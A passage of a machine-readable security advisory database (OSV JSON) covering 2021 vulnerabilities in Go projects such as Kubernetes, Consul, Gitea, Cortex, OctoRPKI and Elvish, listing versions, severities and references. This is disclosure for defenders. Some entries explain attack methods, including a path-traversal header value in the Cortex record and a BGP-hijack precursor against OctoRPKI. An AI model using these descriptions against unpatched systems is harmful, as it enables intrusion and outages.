"ECOSYSTEM", "events": [{"introduced": "1.16.0"}, {"fixed": "1.18.19"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.19.0"}, {"fixed": "1.19.11"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.20.0"}, {"fixed": "1.20.7"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.21.0"}, {"fixed": "1.21.1"}]}], "versions": ["1.21.0"]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-25737"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/102106"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/kubernetes"}, {"type": "WEB", "url": "https://groups.google.com/g/kubernetes-security-announce/c/xAiN3924thY"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20211004-0004/"}], "database_specific": {"cwe_ids": ["CWE-184", "CWE-601"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-09-07T18:59:14Z", "nvd_published_at": "2021-09-06T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-ccw8-7688-vqx4", "modified": "2022-08-10T23:49:51Z", "published": "2021-09-08T20:14:48Z", "aliases": ["CVE-2021-37219"], "summary": "HashiCorp Consul Privilege Escalation Vulnerability", "details": "HashiCorp Consul and Consul Enterprise 1.10.1 Raft RPC layer allows non-server agents with a valid certificate signed by the same CA to access server-only functionality, enabling privilege escalation. Fixed in 1.8.15, 1.9.9 and 1.10.2.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.10.1"}, {"fixed": "1.10.2"}]}], "versions": ["1.10.1"]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.9.0"}, {"fixed": "1.9.9"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.8.15"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-37219"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/pull/10925"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/commit/3357e57dac9aadabd476f7a14973e47f003c4cf0"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/commit/473edd1764b6739e2e4610ea5dede4c2bc6009d1"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/commit/ccf8eb1947357434eb6e66303ddab79f4c9d4103"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2021-22-consul-raft-rpc-privilege-escalation/29024"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/consul"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202207-01"}, {"type": "WEB", "url": "https://www.hashicorp.com/blog/category/consul"}], "database_specific": {"cwe_ids": ["CWE-295"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-09-08T18:12:59Z", "nvd_published_at": "2021-09-07T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6hw5-6gcx-phmw", "modified": "2021-09-16T18:57:24Z", "published": "2021-09-08T20:14:56Z", "aliases": ["CVE-2021-38698"], "summary": "HashiCorp Consul and Consul Enterprise 1.10.1 Txn.Apply endpoint allowed services to register proxies for other services, enabling access to service traffic.", "details": "HashiCorp Consul and Consul Enterprise 1.10.1 Txn.Apply endpoint allowed services to register proxies for other services, enabling access to service traffic. Fixed in 1.8.15, 1.9.9 and 1.10.2.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.10.1"}, {"fixed": "1.10.2"}]}], "versions": ["1.10.1"]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.9.0"}, {"fixed": "1.9.9"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.8.15"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-38698"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/pull/10824"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2021-24-consul-missing-authorization-check-on-txn-apply-endpoint/29026"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/consul"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202208-09"}, {"type": "WEB", "url": "https://www.hashicorp.com/blog/category/consul"}], "database_specific": {"cwe_ids": ["CWE-862", "CWE-863"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-09-08T18:12:00Z", "nvd_published_at": "2021-09-07T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-g95p-88p4-76cm", "modified": "2021-09-27T19:23:33Z", "published": "2021-09-27T20:17:39Z", "aliases": ["CVE-2021-28378"], "summary": "Cross-site Scripting in Gitea", "details": "Gitea 1.12.x and 1.13.x before 1.13.4 allows XSS via certain issue data in some situations.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "code.gitea.io/gitea"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.13.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-28378"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/pull/14898"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/pull/14899"}, {"type": "WEB", "url": "https://blog.gitea.io/2021/03/gitea-1.13.4-is-released/"}, {"type": "WEB", "url": "https://github.com/PandatiX/CVE-2021-28378"}, {"type": "PACKAGE", "url": "https://github.com/go-gitea/gitea"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-09-27T19:23:33Z", "nvd_published_at": "2021-03-15T06:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7h6j-2268-fhcm", "modified": "2022-07-16T04:16:14Z", "published": "2021-09-02T22:00:01Z", "aliases": ["CVE-2020-9321"], "summary": "Improper Certificate Handling", "details": "configurationwatcher.go in Traefik 2.x before 2.1.4 and TraefikEE 2.0.0 mishandles the purging of certificate contents from providers before logging.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N/E:U/RL:O/RC:C"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/traefik/traefik"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-9321"}, {"type": "WEB", "url": "https://github.com/traefik/traefik/pull/6281"}, {"type": "PACKAGE", "url": "https://github.com/traefik/traefik"}, {"type": "WEB", "url": "https://github.com/traefik/traefik/releases/tag/v2.1.4"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-295"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-08-02T22:19:23Z", "nvd_published_at": "2020-03-16T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jphm-g89m-v42p", "modified": "2021-08-30T23:21:48Z", "published": "2021-09-02T21:59:50Z", "aliases": ["CVE-2021-36157"], "summary": "Path traversal in Grafana Cortex", "details": "An issue was discovered in Grafana Cortex through 1.9.0. The header value X-Scope-OrgID is used to construct file paths for rules files, and if crafted to conduct directory traversal such as ae ../../sensitive/path/in/deployment pathname, then Cortex will attempt to parse a rules file at that location and include some of the contents in the error message. (Other Cortex API requests can also be sent a malicious OrgID header, e.g., tricking the ingester into writing metrics to a different location, but the effect is nuisance rather than information disclosure.)", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cortexproject/cortex"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.9.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-36157"}, {"type": "WEB", "url": "https://github.com/cortexproject/cortex/pull/4375"}, {"type": "WEB", "url": "https://github.com/cortexproject/cortex/commit/d9e1f81f40c607b9e97c2fc6db70ae54679917c4"}, {"type": "PACKAGE", "url": "https://github.com/cortexproject/cortex"}, {"type": "WEB", "url": "https://grafana.com/docs/grafana/latest/release-notes/"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-08-04T18:31:56Z", "nvd_published_at": "2021-08-03T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5wjf-62hw-q78r", "modified": "2021-09-10T16:33:46Z", "published": "2021-09-10T17:54:13Z", "aliases": ["CVE-2021-39204"], "summary": "Excessive CPU usage", "details": "Envoy, which Pomerium is based on, incorrectly handles resetting of HTTP/2 streams with excessive complexity.  This can lead to high CPU utilization when a large number of streams are reset.  \n\n### Impact\n\nThis can result in a DoS condition.\n\n### Patches\nPomerium versions 0.14.8 and 0.15.1 contain an upgraded envoy binary with this vulnerability patched.\n\n### Workarounds\nN/A\n\n### References\n[envoy GSA](https://github.com/envoyproxy/envoy/security/advisories/GHSA-3xh3-33v5-chcc)\n[envoy CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-32778)\n[envoy announcement](https://groups.google.com/g/envoy-announce/c/5xBpsEZZDfE/m/wD05NZBbAgAJ)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [pomerium/pomerium](https://github.com/pomerium/pomerium/issues)\n* Email us at [security@pomerium.com](mailto:security@pomerium.com)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/pomerium/pomerium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.14.8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/pomerium/pomerium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.15.0"}, {"fixed": "0.15.1"}]}], "versions": ["0.15.0"]}], "references": [{"type": "WEB", "url": "https://github.com/envoyproxy/envoy/security/advisories/GHSA-3xh3-33v5-chcc"}, {"type": "WEB", "url": "https://github.com/pomerium/pomerium/security/advisories/GHSA-5wjf-62hw-q78r"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-39204"}, {"type": "PACKAGE", "url": "https://github.com/pomerium/pomerium"}, {"type": "WEB", "url": "https://groups.google.com/g/envoy-announce/c/5xBpsEZZDfE/m/wD05NZBbAgAJ"}], "database_specific": {"cwe_ids": ["CWE-834"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-09-10T16:33:46Z", "nvd_published_at": "2021-09-09T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-c8xp-8mf3-62h9", "modified": "2021-09-03T21:40:39Z", "published": "2021-09-07T23:02:18Z", "aliases": ["CVE-2021-3761"], "summary": "OctoRPKI lacks contextual out-of-bounds check when validating RPKI ROA maxLength values", "details": "Any CA issuer in the RPKI can trick OctoRPKI prior to https://github.com/cloudflare/cfrpki/commit/a8db4e009ef217484598ba1fd1c595b54e0f6422 into emitting an invalid VRP \"MaxLength\" value, causing RTR sessions to terminate. \n\n### Impact\n\nAn attacker can use this to disable RPKI Origin Validation in a victim network (for example AS 13335 - Cloudflare) prior to launching a BGP hijack which during normal operations would be rejected as \"RPKI invalid\". Additionally, in certain deployments RTR session flapping in and of itself also could cause BGP routing churn, causing availability issues.\n\n### Patches\nhttps://github.com/cloudflare/cfrpki/commit/a8db4e009ef217484598ba1fd1c595b54e0f6422\n\nhttps://github.com/cloudflare/cfrpki/releases/tag/v1.3.0\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [security@cloudflare.com](security@cloudflare.com)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cloudflare/cfrpki"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cloudflare/cfrpki/security/advisories/GHSA-c8xp-8mf3-62h9"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-3761"}, {"type": "WEB", "url": "https://github.com/cloudflare/cfrpki/pull/90"}, {"type": "WEB", "url": "https://github.com/cloudflare/cfrpki/commit/a8db4e009ef217484598ba1fd1c595b54e0f6422"}, {"type": "WEB", "url": "https://github.com/cloudflare/cfrpki/releases/tag/v1.3.0"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0246"}, {"type": "WEB", "url": "https://www.debian.org/security/2022/dsa-5041"}, {"type": "PACKAGE", "url": "github.com/cloudflare/cfrpki"}], "database_specific": {"cwe_ids": ["CWE-295", "CWE-787"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-09-03T21:40:39Z", "nvd_published_at": "2021-09-09T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-fpv6-f8jw-rc3r", "modified": "2022-08-15T20:07:49Z", "published": "2021-09-23T23:17:33Z", "aliases": ["CVE-2021-41088"], "summary": "Elvish vulnerable to remote code execution via the web UI backend", "details": "### Impact\n\nElvish's backend for the experimental web UI (started by `elvish -web`) hosts an endpoint that allows executing the code sent from the web UI.\n\nThe backend does not check the origin of requests correctly. As a result, if the user has the web UI backend open and visits a compromised or malicious website, the website can send arbitrary code to the endpoint in localhost.\n\n### Patches\n\nAll Elvish releases since 0.14.0 no longer include the experimental web UI, although it is still possible for the user to build a version from source that includes it.\n\nThe issue can be patched for previous versions by removing the web UI (found in web, pkg/web or pkg/prog/web, depending on the exact version).\n\n### Workarounds\n\nDo not use the experimental web UI.\n\n### For more information\n\nIf you have any questions or comments about this advisory, please email xiaqqaix@gmail.com.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/elves/elvish"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.14.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/elves/elvish/security/advisories/GHSA-fpv6-f8jw-rc3r"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-41088"}, {"type": "WEB", "url": "https://github.com/elves/elvish/commit/ccc2750037bbbfafe9c1b7a78eadd3bd16e81fe5"}, {"type": "PACKAGE", "url": "https://github.com/elves/elvish"}], "database_specific": {"cwe_ids": ["CWE-346", "CWE-668"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-09-23T21:06:47Z", "nvd_published_at": "2021-09-23T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vrmr-f2qh-3hhf", "modified": "2021-08-30T17:30:36Z", "published": "2021-09-02T17:17:16Z", "aliases": ["CVE-2021-38599"], "summary": "Improper use of cryptographic key in wal-g", "details": "WAL-G before 1.1, when a non-libsodium build (e.g., one of the official binary releases published as GitHub Releases) is used, silently ignores the libsodium encryption key and uploads cleartext backups. This is arguably a Principle of Least Surprise violation because \"the user likely wanted to encrypt all file activity.\"", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/wal-g/wal-g"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-38599"}, {"type": "WEB", "url": "https://github.com/wal-g/wal-g/pull/1062"}, {"type": "WEB", "url": "https://github.com/wal-g/wal-g/commit/cadf598e1c2a345915a21a44518c5a4d5401e2e3"}, {"type": "PACKAGE", "url": "https://github.com/wal-g/wal-g"}, {"type": "WEB", "url": "https://github.com/wal-g/wal-g/releases/tag/v1.1"}], "database_specific": {"cwe_ids": ["CWE-922"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-08-30T17:30:36Z", "nvd_published_at": "2021-08-12T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-wx8q-rgfr-cf6v", "modified": "2021-12-10T18:30:24Z", "published": "2021-11-10T18:20:11Z", "aliases": ["CVE-2021-22565"], "summary": "Insufficient Granularity of Access Control in github.com/google/exposure-notifications-verification-server", "details": "### Impact\nUsers or API keys with permission to expire verification codes could have expired codes that belonged to another realm if they guessed the UUID.\n\n### Patches\nv1.1.2+\n\n### Workarounds\nThere are no workarounds, and there are no indications this has been exploited in the wild. Verification codes can only be expired by providing their 64-bit UUID, and verification codes are already valid for a very short period of time (thus the UUID rotates frequently).\n\n### For more information\nContact exposure-notifications-feedback@google.com", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/google/exposure-notifications-verification-server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/google/exposure-notifications-verification-server/security/advisories/GHSA-wx8q-rgfr-cf6v"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-22565"}, {"type": "PACKAGE", "url": "https://github.com/google/exposure-notifications-verification-server/"}, {"type": "WEB", "url": "https://github.com/google/exposure-notifications-verification-server/releases/tag/v1.1.2"}], "database_specific": {"cwe_ids": ["CWE-284"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-11-09T21:03:07Z", "nvd_published_at": "2021-12-09T13:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8cvr-4rrf-f244", "modified": "2023-10-02T15:56:11Z", "published": "2021-11-10T20:15:44Z", "aliases": ["CVE-2021-3909"], "summary": "Infinite open connection causes OctoRPKI to hang forever", "details": "OctoRPKI (github.com/cloudflare/cfrpki/cmd/octorpki) does not limit the length of a connection, allowing for a slowloris DOS attack to take place which makes OctoRPKI wait forever. Specifically, the repository that OctoRPKI sends HTTP requests to will keep the connection open for a day before a response is returned, but does keep drip feeding new bytes to keep the connection alive.\n\n## Patches\n\n## For more information\nIf you have any questions or comments about this advisory email us at security@cloudflare.com\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cloudflare/cfrpki"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cloudflare/cfrpki/security/advisories/GHSA-8cvr-4rrf-f244"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-3909"}, {"type": "PACKAGE", "url": "https://github.com/cloudflare/cfrpki"}, {"type": "WEB", "url": "https://github.com/cloudflare/cfrpki/releases/tag/v1.4.0"}, {"type": "WEB", "url": "https://www.debian.org/security/2021/dsa-5033"}, {"type": "WEB", "url": "https://www.debian.org/security/2022/dsa-5041"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-11-10T18:18:28Z", "nvd_published_at": "2021-11-11T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5mxh-2qfv-4g7j", "modified": "2022-04-05T19:29:23Z", "published": "2021-11-10T20:15:06Z", "aliases": ["CVE-2021-3910"], "summary": "NUL character in ROA causes OctoRPKI to crash", "details": "OctoRPKI crashes when encountering a repository that returns an invalid ROA (just an encoded `NUL` (`\\0`) character).\n\n## Patches\n\n## For more information\nIf you have any questions or comments about this advisory email us at security@cloudflare.com", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cloudflare/cfrpki"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cloudflare/cfrpki/security/advisories/GHSA-5mxh-2qfv-4g7j"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-3910"}, {"type": "WEB", "url": "https://github.com/cloudflare/cfrpki/commit/76f0f7a98da001fa04e5bc0407c6702f91096bfa"}, {"type": "PACKAGE", "url": "https://github.com/cloudflare/cfrpki"}, {"type": "WEB", "url": "https://github.com/cloudflare/cfrpki/releases/tag/v1.4.0"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0251"}, {"type": "WEB", "url": "https://www.debian.org/security/2022/dsa-5041"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-11-10T18:17:39Z", "nvd_published_at": "2021-11-11T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-f5f7-6478-qm6p", "modified": "2021-11-01T17:26:17Z", "published": "2021-11-01T17:32:28Z", "aliases": ["CVE-2021-25741"], "summary": "Files or Directories Accessible to External Parties in kubernetes", "details": "A security issue was discovered in Kubernetes where a user may be able to create a container with subpath volume mounts to access files & directories outside of the volume, including on the host filesystem.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.19.15"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.20.0"}, {"fixed": "1.20.11"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.21.0"}, {"fixed": "1.21.5"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.22.0"}, {"fixed": "1.22.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/bottlerocket-os/bottlerocket/security/advisories/GHSA-f5f7-6478-qm6p"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-25741"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/104980"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/kubernetes"}, {"type": "WEB", "url": "https://groups.google.com/g/kubernetes-security-announce/c/nyfdhK24H7s"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20211008-0006/"}], "database_specific": {"cwe_ids": ["CWE-20", "CWE-552"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-11-01T17:26:17Z", "nvd_published_at": "2021-09-20T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-458f-26r3-x2c3", "modified": "2021-11-25T00:24:32Z", "published": "2021-11-29T18:00:21Z", "aliases": ["CVE-2021-20848"], "summary": "Cross-site Scripting in github.com/schollz/rwtxt", "details": "Cross-site scripting vulnerability in rwtxt versions prior to v1.8.6 allows a remote attacker to inject an arbitrary script via unspecified vectors.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/schollz/rwtxt"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.8.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-20848"}, {"type": "WEB", "url": "https://github.com/schollz/rwtxt/commit/c09fb17375c4c47b49524c688288af1fe20e730a"}, {"type": "PACKAGE", "url": "https://github.com/schollz/rwtxt"}, {"type": "WEB", "url": "https://jvn.jp/en/jp/JVN22515597/index.html"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-11-25T00:24:32Z", "nvd_published_at": "2021-11-24T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-3pqh-p72c-fj85", "modified": "2021-11-19T13:10:27Z", "published": "2021-11-19T19:34:26Z", "aliases": ["CVE-2021-3978"], "summary": "Improper Preservation of Permissions in github.com/cloudflare/cfrpki/cmd/octorpki", "details": "### Impact\n\nWhen copying files with rsync, octorpki uses the \"-a\" flag 0, which forces rsync to copy binaries with the suid bit set as root. Since the provided service definition defaults to root (https://github.com/cloudflare/cfrpki/blob/master/package/octorpki.service) this could allow for a vector, when combined with another vulnerability that causes octorpki to process a malicious TAL file, for a local privilege escalation.  \n\n## For more information\n\nIf you have any questions or comments about this advisory email us at security@cloudflare.com", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cloudflare/cfrpki"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cloudflare/cfrpki/security/advisories/GHSA-3pqh-p72c-fj85"}, {"type": "PACKAGE", "url": "https://github.com/cloudflare/cfrpki"}], "database_specific": {"cwe_ids": ["CWE-281"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-11-19T13:10:27Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-5m8f-chrv-7rw5", "modified": "2023-09-18T19:45:26Z", "published": "2021-11-23T18:04:47Z", "aliases": ["CVE-2021-43668"], "summary": "Denial of Service in Go-Ethereum", "details": "Go-Ethereum 1.10.9 nodes crash (denial of service) after receiving a serial of messages and cannot be recovered. They will crash with \"runtime error: invalid memory address or nil pointer dereference\" and arise a SEGV signal.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ethereum/go-ethereum"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.10.9"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-43668"}, {"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/issues/23866"}, {"type": "WEB", "url": "https://github.com/syndtr/goleveldb/issues/373"}, {"type": "PACKAGE", "url": "https://github.com/ethereum/go-ethereum"}], "database_specific": {"cwe_ids": ["CWE-476"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-11-19T13:19:43Z", "nvd_published_at": "2021-11-18T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6c7m-qwxj-mvhp", "modified": "2021-11-24T19:01:48Z", "published": "2021-11-19T20:55:16Z", "aliases": ["CVE-2021-41278"], "summary": "Broken encryption in EdgeX Foundry", "details": "### Summary\nBroken encryption in app-functions-sdk \u201cAES\u201d transform in EdgeX Foundry releases prior to Jakarta allows attackers to decrypt messages via unspecified vectors.\n\n### Detailed Description\nThe app-functions-sdk exports an \u201caes\u201d transform that user scripts can optionally call to encrypt data in the processing pipeline.  No decrypt function is provided.  Encryption is not enabled by default, but if used, the level of protection may be less than the user may expects due to a broken implementation in https://github.com/edgexfoundry/app-functions-sdk-go/blob/v1.0.0/pkg/transforms/encryption.go \n\nVersion v2.1.0 (EdgeX Foundry Jakarta release and later) of app-functions-sdk-go/v2 deprecates the \u201caes\u201d transform and provides an improved \u201caes256\u201d transform in its place.  The broken implementation will remain in a deprecated state until it is removed in the next EdgeX major release to avoid breakage of existing software that depends on the broken implementation.\n\n### Impact\nAs the broken transform is a library function that is not invoked by default, users who do not use the AES transform in their processing pipelines are unaffected.  Those that are affected are urged to upgrade to the Jakarta EdgeX release and modify processing pipelines to use the new \"aes256\" transform.\n\n#### Vulnerable go modules\n- github.com/edgexfoundry/app-functions-sdk-go  < v2.1.0\n- github.com/edgexfoundry/app-functions-sdk-go/v2  < v2.1.0\n- github.com/edgexfoundry/app-service-configurable < v2.1.0\n\n#### Vulnerable containers\n- https://hub.docker.com/r/edgexfoundry/app-service-configurable >= 2.0.0 < v2.1.0\n- https://hub.docker.com/r/edgexfoundry/app-service-configurable-arm64  >= 2.0.0 < 2.1.0\n- https://hub.docker.com/r/edgexfoundry/docker-app-service-configurable  < 2.0.0\n- https://hub.docker.com/r/edgexfoundry/docker-app-service-configurable-arm64 < 2.0.0 \n\n#### Vulnerable Snaps\n- 